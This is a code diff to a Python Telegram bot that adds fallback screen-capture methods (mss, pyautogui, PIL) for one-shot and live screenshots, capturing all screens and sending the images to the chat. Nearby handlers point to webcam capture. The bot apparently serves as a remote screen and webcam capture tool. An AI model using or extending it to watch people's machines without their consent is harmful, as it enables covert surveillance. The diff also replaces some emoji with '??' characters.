@@ -173,21 +173,37 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def screenshot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_auth(update): return
-    await update.message.reply_text("Taking screenshot... 📸")
+    await update.message.reply_text("Taking screenshot... ??")
     screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
     try:
+        success = False
         try:
-            pyautogui.screenshot(screenshot_path)
+            import mss
+            with mss.mss() as sct:
+                sct.shot(output=screenshot_path)
+            success = True
         except Exception:
+            pass
+
+        if not success:
+            try:
+                import pyautogui
+                pyautogui.screenshot(screenshot_path)
+                success = True
+            except Exception:
+                pass
+
+        if not success:
             from PIL import ImageGrab
-            im = ImageGrab.grab(all_screens=False)
+            im = ImageGrab.grab(all_screens=True)
             im.save(screenshot_path)
+
         with open(screenshot_path, "rb") as photo:
             await update.message.reply_photo(photo)
         if os.path.exists(screenshot_path):
             os.remove(screenshot_path)
     except Exception as e:
-        await update.message.reply_text(f"❌ Screenshot failed: {e}")
+        await update.message.reply_text(f"? Screenshot failed: {e}")
 
 async def webcam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_auth(update): return
@@ -262,11 +278,16 @@ async def livescreen_loop(update, context):
         try:
             screenshot_path = os.path.join(TEMP_DIR, "live_screen.png")
             try:
-                pyautogui.screenshot(screenshot_path)
+                import mss
+                with mss.mss() as sct:
+                    sct.shot(output=screenshot_path)
             except Exception:
-                from PIL import ImageGrab
-                im = ImageGrab.grab(all_screens=False)
-                im.save(screenshot_path)
+                try:
+                    pyautogui.screenshot(screenshot_path)
+                except Exception:
+                    from PIL import ImageGrab
+                    im = ImageGrab.grab(all_screens=True)
+                    im.save(screenshot_path)
             with open(screenshot_path, "rb") as photo:
                 await update.message.reply_photo(photo)
             if os.path.exists(screenshot_path):
@@ -1261,5 +1282,7 @@ if __name__ == "__main__":
 
             # Wait 10 seconds before trying to reconnect to Telegram
             time.sleep(10)
+
+
 
 
